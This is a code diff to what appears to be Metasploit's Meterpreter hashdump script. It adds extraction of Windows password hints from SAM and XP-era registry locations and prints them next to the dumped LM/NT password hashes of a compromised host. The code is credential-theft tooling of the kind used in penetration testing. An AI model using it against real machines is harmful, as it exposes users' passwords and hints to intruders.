@@ -102,8 +102,9 @@ def capture_user_keys
 		users[usr.to_i(16)][:F] = uk.query_value("F").data
 		users[usr.to_i(16)][:V] = uk.query_value("V").data
 		
+		#Attempt to get Hints (from Win7/Win8 Location)
 		begin
-			users[usr.to_i(16)][:UserPasswordHint] = uk.query_value("UserPasswordHint").data
+			users[usr.to_i(16)][:UserPasswordHint] = decode_windows_hint(uk.query_value("UserPasswordHint").data.unpack("H*")[0])
 		rescue ::Rex::Post::Meterpreter::RequestError
 			users[usr.to_i(16)][:UserPasswordHint] = nil
 		end
@@ -119,6 +120,17 @@ def capture_user_keys
 		rid = r.type
 		users[rid] ||= {}
 		users[rid][:Name] = usr
+		
+		#Attempt to get Hints (from WinXP Location) only if it's not set yet
+		if users[rid][:UserPasswordHint].nil?	
+			begin
+				uk_hint = @client.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Hints\\#{usr}", KEY_READ)
+				users[rid][:UserPasswordHint] = uk_hint.query_value("").data
+			rescue ::Rex::Post::Meterpreter::RequestError
+				users[rid][:UserPasswordHint] = nil
+			end
+		end
+		
 		uk.close
 	end
 	ok.close
@@ -242,6 +254,19 @@ if client.platform =~ /win32|win64/
 		print_status("Decrypting user keys...")
 		users    = decrypt_user_keys(hbootkey, users)
 
+		print_status("Dumping password hints...")
+		print_line()
+		hint_count = 0
+		users.keys.sort{|a,b| a<=>b}.each do |rid|
+			#If we have a hint then print it
+			if !users[rid][:UserPasswordHint].nil? && users[rid][:UserPasswordHint].length > 0
+				print_line "#{users[rid][:Name]}:\"#{users[rid][:UserPasswordHint]}\""
+				hint_count += 1
+			end	
+		end
+		print_line("No users with password hints on this system") if hint_count == 0 
+		print_line()
+
 		print_status("Dumping password hashes...")
 		print_line()
 		print_line()
@@ -255,11 +280,6 @@ if client.platform =~ /win32|win64/
 				:pass  => users[rid][:hashlm].unpack("H*")[0] +":"+ users[rid][:hashnt].unpack("H*")[0],
 				:type  => "smb_hash"
 			)
-			
-			#If we have a hint, decode and add to the hashstring
-			if !users[rid][:UserPasswordHint].nil?
-				hashstring += " (Hint: \"#{decode_windows_hint(users[rid][:UserPasswordHint].unpack("H*")[0])}\")"
-			end
 			
 			print_line hashstring
 			
